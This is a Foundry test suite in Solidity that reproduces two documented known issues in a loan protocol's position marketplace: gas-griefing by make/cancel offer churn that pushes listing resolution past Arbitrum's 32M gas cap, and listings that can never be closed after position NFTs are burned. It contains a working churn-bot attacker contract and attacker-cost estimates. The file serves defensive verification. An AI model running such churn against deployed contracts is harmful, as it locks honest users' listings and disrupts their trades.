// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/interfaces/draft-IERC6093.sol";
import "../utils/TestSetup.sol";
import "../utils/NFTTestSetup.sol";

// ============================================================================
// SR1 — independent reproduction of known issues KI-1 and KI-2
// ============================================================================
//
// See docs/known-issues.md. Every test in SR1Suite runs against BOTH stacks:
//   SR1_LoanProtocol     (LoanProtocol + PositionNFT)
//   SR1_NFTLoanProtocol  (NFTLoanProtocol + NFTPositionNFT)
//
// KI-1  _refundOtherOffers iterates 1..marketplaceOfferNonce (monotonic), not the
//       active offers. Make/cancel churn grows every listing-resolution path until it
//       exceeds the per-transaction gas limit.
// KI-2  repayLoan / claimCollateral burn both position NFTs; unlistPosition and
//       cleanStaleListing call ownerOf on the burned token and revert, so the
//       listing's `active` flag can never be cleared.
//
// Gas methodology
//   On mainnet every resolution call is a fresh transaction, so each dead offer's
//   status slot is a cold SLOAD. Inside one Foundry test all slots touched by the churn
//   are warm. "Cold" figures below call vm.cool on every contract the call touches
//   (proxies, implementations, token) immediately before the measured call; "warm"
//   figures do not. Cold is the mainnet-realistic figure. Cross-check: under
//   `forge test --isolate` the warm test measures the cold figure (~2,525 per offer)
//   and therefore fails its warm bounds by design; run it without --isolate. Measured gas is execution
//   gas: it excludes the 21,000 intrinsic cost and the L1 data fee, and includes
//   ~2.6k for the cold CALL into the proxy.
//
// Churn is genuine: every cycle is a real makeMarketplaceOffer + cancelMarketplaceOffer.
// Gas metering is paused during the churn only so the setup does not exhaust the
// test's own gas budget; it is resumed before anything is measured.
//
// Network parameters read from Arbitrum One (ArbGasInfo precompile 0x6C) at block
// 508,716,820 on 2026-09-25, ArbOS version 116:
//   getMaxTxGasLimit()   = 32,000,000
//   getMinimumGasPrice() = 20,000,000 wei (0.02 gwei)
// ============================================================================

/// @dev Marketplace surface shared by LoanProtocol and NFTLoanProtocol (identical signatures).
interface ISR1Market {
    function GRACE_PERIOD() external view returns (uint256);
    function listPosition(uint256, string calldata, address, uint256, uint256) external;
    function unlistPosition(uint256) external;
    function cleanStaleListing(uint256) external;
    function makeMarketplaceOffer(uint256, uint256, uint256, address) external returns (uint256);
    function cancelMarketplaceOffer(uint256, uint256) external;
    function counterMarketplaceOffer(uint256, uint256, uint256, uint256) external;
    function acceptMarketplaceOffer(uint256, uint256) external;
    function acceptMarketplaceCounterOffer(uint256, uint256) external;
    function buyPosition(uint256, uint256, address) external;
    function repayLoan(uint256) external;
    function claimCollateral(uint256) external;
    function markDefault(uint256) external;
    function marketplaceOfferNonce(uint256) external view returns (uint256);
    function activeOfferCount(uint256) external view returns (uint256);
    function marketplaceListings(uint256)
        external
        view
        returns (address, uint256, string memory, address, uint256, uint256, uint256, bool);
}

interface ISR1Token {
    function mint(address, uint256) external;
    function approve(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

interface ISR1PositionNFT {
    function ownerOf(uint256) external view returns (address);
    function transferFrom(address, address, uint256) external;
    function getBorrowerTokenId(uint256) external view returns (uint256);
}

/// @dev An attacker contract that batches make/cancel cycles in one transaction
///      (the cheapest way to churn; gives the lower bound of attacker cost).
contract SR1ChurnBot {
    function approve(address token, address market) external {
        ISR1Token(token).approve(market, type(uint256).max);
    }

    function churn(ISR1Market market, address token, uint256 tokenId, uint256 amount, uint256 cycles) external {
        for (uint256 i = 0; i < cycles; i++) {
            uint256 id = market.makeMarketplaceOffer(tokenId, amount, 1 days, token);
            market.cancelMarketplaceOffer(tokenId, id);
        }
    }
}

abstract contract SR1Suite is Test {
    // Arbitrum One network parameters (see header)
    uint256 internal constant ARB_MAX_TX_GAS = 32_000_000;
    uint256 internal constant ARB_MIN_GAS_PRICE = 0.02 gwei;
    /// @dev Churn depth for the brick tests; above the ~12.7k cold brick point for unlistPosition
    uint256 internal constant BRICK_N = 13_000;
    /// @dev Gas limit used to prove that a capped failure is caused by gas alone
    uint256 internal constant AMPLE_GAS = 100_000_000;
    uint256 internal constant ASK = 1_000e6;
    uint256 internal constant INTRINSIC_GAS = 21_000;
    bytes32 internal constant IMPL_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    address internal sr1Attacker = makeAddr("sr1-attacker");
    address internal sr1Buyer = makeAddr("sr1-buyer");
    address internal sr1Recipient = makeAddr("sr1-recipient");

    // ------------------------------------------------------------------------
    // Stack hooks
    // ------------------------------------------------------------------------

    function _market() internal view virtual returns (ISR1Market);
    function _pnft() internal view virtual returns (ISR1PositionNFT);
    function _token() internal view virtual returns (address);
    function _seller() internal view virtual returns (address);
    function _lenderAddr() internal view virtual returns (address);
    function _newActiveLoan() internal virtual returns (uint256 loanId);
    function _maturity(uint256 loanId) internal view virtual returns (uint256);
    function _repaymentAmount(uint256 loanId) internal view virtual returns (uint256);

    // ------------------------------------------------------------------------
    // Helpers
    // ------------------------------------------------------------------------

    function _fund(address who, uint256 amount) internal {
        ISR1Token(_token()).mint(who, amount);
        vm.prank(who);
        ISR1Token(_token()).approve(address(_market()), type(uint256).max);
    }

    function _balance(address who) internal view returns (uint256) {
        return ISR1Token(_token()).balanceOf(who);
    }

    /// @dev New active loan with its borrower position listed at ASK, no offer floor
    function _listBorrowerPosition() internal returns (uint256 loanId, uint256 tokenId) {
        loanId = _newActiveLoan();
        tokenId = _pnft().getBorrowerTokenId(loanId);
        vm.prank(_seller());
        _market().listPosition(loanId, "borrower", _token(), ASK, 0);
    }

    /// @dev n genuine make+cancel cycles with a 1-unit escrow that is recycled every cycle
    function _churn(uint256 tokenId, uint256 n) internal {
        vm.pauseGasMetering();
        _fund(sr1Attacker, 1);
        vm.startPrank(sr1Attacker);
        for (uint256 i = 0; i < n; i++) {
            uint256 id = _market().makeMarketplaceOffer(tokenId, 1, 1 days, _token());
            _market().cancelMarketplaceOffer(tokenId, id);
        }
        vm.stopPrank();
        vm.resumeGasMetering();
    }

    function _impl(address proxy) internal view returns (address) {
        return address(uint160(uint256(vm.load(proxy, IMPL_SLOT))));
    }

    /// @dev Reproduce fresh-transaction conditions: every account and slot the call touches is cold
    function _coolAll() internal {
        address market = address(_market());
        address pnft = address(_pnft());
        vm.cool(market);
        vm.cool(_impl(market));
        vm.cool(pnft);
        vm.cool(_impl(pnft));
        vm.cool(_token());
    }

    function _call(address from, bytes memory data, uint256 gasLimit, bool cold)
        internal
        returns (bool ok, uint256 used, bytes memory ret)
    {
        if (cold) _coolAll();
        address market = address(_market());
        vm.prank(from);
        uint256 g = gasleft();
        (ok, ret) = market.call{gas: gasLimit}(data);
        used = g - gasleft();
    }

    /// @dev Asserts the call fails under the Arbitrum per-transaction cap with no revert data
    ///      (out of gas), and succeeds with ample gas, so gas is the only cause. State is restored.
    function _assertBrickedOnlyByGas(address from, bytes memory data, string memory label)
        internal
        returns (uint256 needed)
    {
        uint256 snap = vm.snapshotState();
        (bool ok, , bytes memory ret) = _call(from, data, ARB_MAX_TX_GAS, true);
        assertFalse(ok, string.concat(label, ": succeeded under the 32M cap"));
        assertEq(ret.length, 0, string.concat(label, ": reverted with data, not out of gas"));
        vm.revertToState(snap);

        (ok, needed, ) = _call(from, data, AMPLE_GAS, true);
        assertTrue(ok, string.concat(label, ": failed even with ample gas"));
        assertGt(needed, ARB_MAX_TX_GAS);
        vm.revertToState(snap);
        emit log_named_uint(string.concat("  ", label, " gas needed (cold)"), needed);
    }

    function _isActive(uint256 tokenId) internal view returns (bool active) {
        (, , , , , , , active) = _market().marketplaceListings(tokenId);
    }

    function _repay(uint256 loanId) internal {
        _fund(_seller(), _repaymentAmount(loanId));
        vm.prank(_seller());
        _market().repayLoan(loanId);
    }

    function _warpPastGrace(uint256 loanId) internal {
        vm.warp(_maturity(loanId) + _market().GRACE_PERIOD() + 1);
    }

    function _unlistData(uint256 tokenId) internal pure returns (bytes memory) {
        return abi.encodeCall(ISR1Market.unlistPosition, (tokenId));
    }

    // ========================================================================
    // Test 1 — KI-1 gas growth (cold and warm)
    // ========================================================================

    function _gasGrowth(bool cold) internal returns (uint256 perOffer) {
        uint256[4] memory ns = [uint256(0), 100, 1_000, 5_000];
        uint256[4] memory gasAt;
        (, uint256 tokenId) = _listBorrowerPosition();
        uint256 done;
        for (uint256 k = 0; k < ns.length; k++) {
            _churn(tokenId, ns[k] - done);
            done = ns[k];
            assertEq(_market().marketplaceOfferNonce(tokenId), ns[k]);
            assertEq(_market().activeOfferCount(tokenId), 0);

            uint256 snap = vm.snapshotState();
            (bool ok, uint256 used, ) = _call(_seller(), _unlistData(tokenId), AMPLE_GAS, cold);
            assertTrue(ok);
            vm.revertToState(snap);
            gasAt[k] = used;
            emit log_named_uint(string.concat("  unlistPosition gas @ N=", vm.toString(ns[k])), used);
        }
        for (uint256 k = 1; k < ns.length; k++) assertGt(gasAt[k], gasAt[k - 1]);
        perOffer = (gasAt[3] - gasAt[1]) / (ns[3] - ns[1]);
        emit log_named_uint("  gas per dead offer (N=100..5000)", perOffer);
    }

    function test_KI1_gasGrowth_cold() public {
        emit log("KI-1 unlistPosition gas vs churn, COLD (mainnet-realistic)");
        uint256 perOffer = _gasGrowth(true);
        // One cold SLOAD (2,100) per dead offer plus loop overhead
        assertGe(perOffer, 2_300);
        assertLe(perOffer, 2_800);
    }

    function test_KI1_gasGrowth_warm() public {
        emit log("KI-1 unlistPosition gas vs churn, WARM (in-test artefact)");
        uint256 perOffer = _gasGrowth(false);
        // One warm SLOAD (100) per dead offer plus loop overhead
        assertGe(perOffer, 300);
        assertLe(perOffer, 800);
    }

    // ========================================================================
    // Test 2 — KI-1 brick: every resolution path exceeds 32M
    // ========================================================================

    function test_KI1_brick_allResolutionPathsExceedTxGasLimit() public {
        (uint256 loanId, uint256 tokenId) = _listBorrowerPosition();

        // An honest buyer's standing offer, made before the churn
        _fund(sr1Buyer, 10 * ASK);
        vm.prank(sr1Buyer);
        uint256 honestOffer = _market().makeMarketplaceOffer(tokenId, ASK / 2, 1 days, _token());

        _churn(tokenId, BRICK_N);
        assertEq(_market().marketplaceOfferNonce(tokenId), BRICK_N + 1);
        assertEq(_market().activeOfferCount(tokenId), 1);

        emit log_named_uint("KI-1 brick at churn N", BRICK_N);
        _assertBrickedOnlyByGas(_seller(), _unlistData(tokenId), "unlistPosition (seller)");
        _assertBrickedOnlyByGas(
            _seller(), abi.encodeCall(ISR1Market.acceptMarketplaceOffer, (tokenId, honestOffer)), "acceptMarketplaceOffer"
        );
        _assertBrickedOnlyByGas(
            sr1Buyer, abi.encodeCall(ISR1Market.buyPosition, (tokenId, ASK, _token())), "buyPosition"
        );

        // Counter-offer path
        uint256 snap = vm.snapshotState();
        vm.prank(_seller());
        _market().counterMarketplaceOffer(tokenId, honestOffer, ASK, 1 days);
        _assertBrickedOnlyByGas(
            sr1Buyer,
            abi.encodeCall(ISR1Market.acceptMarketplaceCounterOffer, (tokenId, honestOffer)),
            "acceptMarketplaceCounterOffer"
        );
        vm.revertToState(snap);

        // Stale path: position transferred directly, bypassing the marketplace
        vm.prank(_seller());
        _pnft().transferFrom(_seller(), sr1Recipient, tokenId);
        _assertBrickedOnlyByGas(
            sr1Buyer, abi.encodeCall(ISR1Market.cleanStaleListing, (tokenId)), "cleanStaleListing (anyone)"
        );
        _assertBrickedOnlyByGas(sr1Recipient, _unlistData(tokenId), "unlistPosition (new owner)");

        // The new owner can never list the position
        vm.prank(sr1Recipient);
        vm.expectRevert(bytes4(keccak256("AlreadyListed()")));
        _market().listPosition(loanId, "borrower", _token(), ASK, 0);
        assertTrue(_isActive(tokenId));
        vm.revertToState(snap);

        // Nor can the original seller re-list
        vm.prank(_seller());
        vm.expectRevert(bytes4(keccak256("AlreadyListed()")));
        _market().listPosition(loanId, "borrower", _token(), ASK, 0);
        assertTrue(_isActive(tokenId));

        // Escrow on the bricked listing is not locked: O(1) cancel refunds in full
        uint256 before = _balance(sr1Buyer);
        (bool ok, uint256 used, ) = _call(
            sr1Buyer, abi.encodeCall(ISR1Market.cancelMarketplaceOffer, (tokenId, honestOffer)), ARB_MAX_TX_GAS, true
        );
        assertTrue(ok, "cancel on bricked listing failed");
        assertEq(_balance(sr1Buyer), before + ASK / 2);
        assertLt(used, 200_000);
        emit log_named_uint("  cancelMarketplaceOffer on bricked listing (cold)", used);

        // The loan itself settles normally: repay ...
        snap = vm.snapshotState();
        _fund(_seller(), _repaymentAmount(loanId));
        (ok, used, ) = _call(_seller(), abi.encodeCall(ISR1Market.repayLoan, (loanId)), ARB_MAX_TX_GAS, true);
        assertTrue(ok, "repayLoan failed on bricked listing");
        assertLt(used, 1_000_000);
        emit log_named_uint("  repayLoan with bricked listing (cold)", used);
        vm.revertToState(snap);

        // ... or default
        _warpPastGrace(loanId);
        (ok, used, ) =
            _call(_lenderAddr(), abi.encodeCall(ISR1Market.claimCollateral, (loanId)), ARB_MAX_TX_GAS, true);
        assertTrue(ok, "claimCollateral failed on bricked listing");
        assertLt(used, 1_000_000);
        emit log_named_uint("  claimCollateral with bricked listing (cold)", used);
    }

    /// @dev Below the brick point the seller can still unlist; doing so resets the nonce,
    ///      so a fresh listing starts from zero churn.
    function test_KI1_unlistBeforeBrickResetsNonce() public {
        (uint256 loanId, uint256 tokenId) = _listBorrowerPosition();
        _churn(tokenId, 1_000);

        (bool ok, uint256 used, ) = _call(_seller(), _unlistData(tokenId), ARB_MAX_TX_GAS, true);
        assertTrue(ok, "unlist below brick point failed");
        assertLt(used, ARB_MAX_TX_GAS);
        assertEq(_market().marketplaceOfferNonce(tokenId), 0);
        assertFalse(_isActive(tokenId));

        vm.prank(_seller());
        _market().listPosition(loanId, "borrower", _token(), ASK, 0);
        assertTrue(_isActive(tokenId));
        (ok, used, ) = _call(_seller(), _unlistData(tokenId), ARB_MAX_TX_GAS, true);
        assertTrue(ok);
        assertLt(used, 100_000, "fresh listing still carries old churn");
    }

    // ========================================================================
    // Test 3 — KI-1 attacker cost; minOfferAmount does not prevent the attack
    // ========================================================================

    function test_KI1_attackerCost() public {
        (, uint256 tokenId) = _listBorrowerPosition();

        uint256 snap = vm.snapshotState();
        (bool ok, uint256 base, ) = _call(_seller(), _unlistData(tokenId), AMPLE_GAS, true);
        assertTrue(ok);
        vm.revertToState(snap);

        _churn(tokenId, 1_000);
        snap = vm.snapshotState();
        uint256 at1000;
        (ok, at1000, ) = _call(_seller(), _unlistData(tokenId), AMPLE_GAS, true);
        assertTrue(ok);
        vm.revertToState(snap);

        uint256 perOffer = (at1000 - base) / 1_000;
        uint256 brickN = (ARB_MAX_TX_GAS - base) / perOffer + 1;

        // EOA attacker: make and cancel are separate transactions, each starting cold
        _coolAll();
        vm.prank(sr1Attacker);
        uint256 g = gasleft();
        uint256 id = _market().makeMarketplaceOffer(tokenId, 1, 1 days, _token());
        uint256 makeGas = g - gasleft();
        _coolAll();
        vm.prank(sr1Attacker);
        g = gasleft();
        _market().cancelMarketplaceOffer(tokenId, id);
        uint256 cancelGas = g - gasleft();
        uint256 eoaCycle = makeGas + cancelGas + 2 * INTRINSIC_GAS;

        // Contract attacker: 100 cycles batched in one transaction
        SR1ChurnBot bot = new SR1ChurnBot();
        ISR1Token(_token()).mint(address(bot), 1);
        bot.approve(_token(), address(_market()));
        _coolAll();
        vm.cool(address(bot));
        g = gasleft();
        bot.churn(_market(), _token(), tokenId, 1, 100);
        uint256 batchedCycle = (g - gasleft() + INTRINSIC_GAS) / 100;

        emit log("KI-1 attacker cost");
        emit log_named_uint("  unlistPosition base gas, N=0 (cold)", base);
        emit log_named_uint("  gas per dead offer (cold)", perOffer);
        emit log_named_uint("  brick point for unlistPosition at 32M (cycles)", brickN);
        emit log_named_uint("  EOA cycle: make (cold exec)", makeGas);
        emit log_named_uint("  EOA cycle: cancel (cold exec)", cancelGas);
        emit log_named_uint("  EOA cycle incl. 2x21k intrinsic", eoaCycle);
        emit log_named_uint("  batched cycle incl. amortised intrinsic", batchedCycle);
        emit log_named_uint("  total gas to brick, batched (low)", brickN * batchedCycle);
        emit log_named_uint("  total gas to brick, EOA (high)", brickN * eoaCycle);
        emit log_named_decimal_uint("  ETH at 0.02 gwei floor, low", brickN * batchedCycle * ARB_MIN_GAS_PRICE, 18);
        emit log_named_decimal_uint("  ETH at 0.02 gwei floor, high", brickN * eoaCycle * ARB_MIN_GAS_PRICE, 18);

        // Consistent with the brick test's churn depth
        assertLt(brickN, BRICK_N);
        assertGt(brickN, 10_000);
    }

    function test_KI1_minOfferAmountDoesNotPrevent() public {
        uint256 loanId = _newActiveLoan();
        uint256 tokenId = _pnft().getBorrowerTokenId(loanId);
        uint256 floor = ASK / 2;
        vm.prank(_seller());
        _market().listPosition(loanId, "borrower", _token(), ASK, floor);

        // The attacker holds exactly one floor-sized escrow
        _fund(sr1Attacker, floor);

        // The floor is enforced ...
        vm.prank(sr1Attacker);
        vm.expectRevert(bytes4(keccak256("OfferBelowMinimum()")));
        _market().makeMarketplaceOffer(tokenId, floor - 1, 1 days, _token());

        // ... but the same escrow is recycled on every cycle
        uint256 cycles = 500;
        vm.startPrank(sr1Attacker);
        for (uint256 i = 0; i < cycles; i++) {
            uint256 id = _market().makeMarketplaceOffer(tokenId, floor, 1 days, _token());
            _market().cancelMarketplaceOffer(tokenId, id);
        }
        vm.stopPrank();

        assertEq(_market().marketplaceOfferNonce(tokenId), cycles);
        assertEq(_market().activeOfferCount(tokenId), 0);
        assertEq(_balance(sr1Attacker), floor, "attacker capital not fully recycled");
    }

    // ========================================================================
    // Test 4 — KI-2: burned position leaves an unclosable listing
    // ========================================================================

    function _assertListingUnclosable(uint256 tokenId) internal {
        bytes memory burned = abi.encodeWithSelector(IERC721Errors.ERC721NonexistentToken.selector, tokenId);

        vm.prank(_seller());
        vm.expectRevert(burned);
        _market().unlistPosition(tokenId);

        vm.prank(sr1Buyer);
        vm.expectRevert(burned);
        _market().cleanStaleListing(tokenId);

        assertTrue(_isActive(tokenId), "listing unexpectedly cleared");
    }

    function test_KI2_afterRepay_listingCannotBeClosed() public {
        (uint256 loanId, uint256 tokenId) = _listBorrowerPosition();
        _repay(loanId);
        _assertListingUnclosable(tokenId);

        // makeMarketplaceOffer does not check loan status: new escrow is accepted on the dead listing ...
        _fund(sr1Buyer, 10 * ASK);
        vm.prank(sr1Buyer);
        uint256 id = _market().makeMarketplaceOffer(tokenId, ASK / 2, 1 days, _token());
        assertEq(_market().activeOfferCount(tokenId), 1);

        // ... but it can never be filled
        vm.prank(_seller());
        vm.expectRevert(bytes4(keccak256("LoanNotActive()")));
        _market().acceptMarketplaceOffer(tokenId, id);
        vm.prank(sr1Buyer);
        vm.expectRevert(bytes4(keccak256("LoanNotActive()")));
        _market().buyPosition(tokenId, ASK, _token());
    }

    function test_KI2_afterDefault_listingCannotBeClosed() public {
        (uint256 loanId, uint256 tokenId) = _listBorrowerPosition();
        _warpPastGrace(loanId);
        vm.prank(_lenderAddr());
        _market().claimCollateral(loanId);
        _assertListingUnclosable(tokenId);
    }

    /// @dev Scope check: the trigger is the burn. markDefault alone burns nothing,
    ///      so the listing can still be closed until collateral is claimed.
    function test_KI2_scope_markDefaultAloneDoesNotTrigger() public {
        (uint256 loanId, uint256 tokenId) = _listBorrowerPosition();
        _warpPastGrace(loanId);
        _market().markDefault(loanId);
        vm.prank(_seller());
        _market().unlistPosition(tokenId);
        assertFalse(_isActive(tokenId));
    }

    // ========================================================================
    // Test 5 — negative test for the "escrow locked" claim
    // ========================================================================

    function _assertImmediateFullRefund(uint256 tokenId, uint256 offerId, uint256 amount) internal {
        uint256 blockBefore = block.number;
        uint256 tsBefore = block.timestamp;
        uint256 before = _balance(sr1Buyer);
        vm.prank(sr1Buyer);
        _market().cancelMarketplaceOffer(tokenId, offerId);
        assertEq(_balance(sr1Buyer), before + amount, "refund not in full");
        assertEq(block.number, blockBefore);
        assertEq(block.timestamp, tsBefore);
    }

    function test_cancelRefundsImmediately_staleListing() public {
        (, uint256 tokenId) = _listBorrowerPosition();
        _fund(sr1Buyer, ASK);
        vm.prank(sr1Buyer);
        uint256 id = _market().makeMarketplaceOffer(tokenId, 800e6, 1 days, _token());

        vm.prank(_seller());
        _pnft().transferFrom(_seller(), sr1Recipient, tokenId);

        _assertImmediateFullRefund(tokenId, id, 800e6);
    }

    function test_cancelRefundsImmediately_repaidListing() public {
        (uint256 loanId, uint256 tokenId) = _listBorrowerPosition();
        _fund(sr1Buyer, 2 * ASK);
        vm.prank(sr1Buyer);
        uint256 before = _market().makeMarketplaceOffer(tokenId, 800e6, 1 days, _token());

        _repay(loanId);

        // Offer made on the dead listing after repayment
        vm.prank(sr1Buyer);
        uint256 afterRepay = _market().makeMarketplaceOffer(tokenId, 700e6, 1 days, _token());

        _assertImmediateFullRefund(tokenId, before, 800e6);
        _assertImmediateFullRefund(tokenId, afterRepay, 700e6);
    }

    function test_cancelRefundsImmediately_defaultedListing() public {
        (uint256 loanId, uint256 tokenId) = _listBorrowerPosition();
        _fund(sr1Buyer, ASK);
        vm.prank(sr1Buyer);
        uint256 id = _market().makeMarketplaceOffer(tokenId, 800e6, 1 days, _token());

        _warpPastGrace(loanId);
        vm.prank(_lenderAddr());
        _market().claimCollateral(loanId);

        _assertImmediateFullRefund(tokenId, id, 800e6);
    }
}

// ============================================================================
// Stack bindings
// ============================================================================

contract SR1_LoanProtocol is TestSetup, SR1Suite {
    function _market() internal view override returns (ISR1Market) {
        return ISR1Market(address(protocol));
    }

    function _pnft() internal view override returns (ISR1PositionNFT) {
        return ISR1PositionNFT(address(positionNFT));
    }

    function _token() internal view override returns (address) {
        return address(loanToken);
    }

    function _seller() internal view override returns (address) {
        return borrower;
    }

    function _lenderAddr() internal view override returns (address) {
        return lender;
    }

    function _newActiveLoan() internal override returns (uint256) {
        return _createActiveLoan();
    }

    function _maturity(uint256 loanId) internal view override returns (uint256) {
        return protocol.getLoan(loanId).maturityTimestamp;
    }

    function _repaymentAmount(uint256 loanId) internal view override returns (uint256) {
        return protocol.getLoan(loanId).repaymentAmount;
    }
}

contract SR1_NFTLoanProtocol is NFTTestSetup, SR1Suite {
    uint256 private nextCollateralId = DEFAULT_NFT_TOKEN_ID;

    function _market() internal view override returns (ISR1Market) {
        return ISR1Market(address(nftProtocol));
    }

    function _pnft() internal view override returns (ISR1PositionNFT) {
        return ISR1PositionNFT(address(nftPositionNFT));
    }

    function _token() internal view override returns (address) {
        return address(loanToken);
    }

    function _seller() internal view override returns (address) {
        return borrower;
    }

    function _lenderAddr() internal view override returns (address) {
        return lender;
    }

    /// @dev Uses a fresh collateral NFT per loan (borrower owns token IDs 1-10)
    function _newActiveLoan() internal override returns (uint256 loanId) {
        loanId = _createNFTAuction(nextCollateralId++);
        vm.prank(lender);
        nftProtocol.placeBid(loanId, DEFAULT_MAX_REPAYMENT);
        vm.warp(block.timestamp + DEFAULT_AUCTION_DURATION + 1);
        nftProtocol.finalizeAuction(loanId);
    }

    function _maturity(uint256 loanId) internal view override returns (uint256) {
        return nftProtocol.getLoan(loanId).maturityTimestamp;
    }

    function _repaymentAmount(uint256 loanId) internal view override returns (uint256) {
        return nftProtocol.getLoan(loanId).repaymentAmount;
    }
}
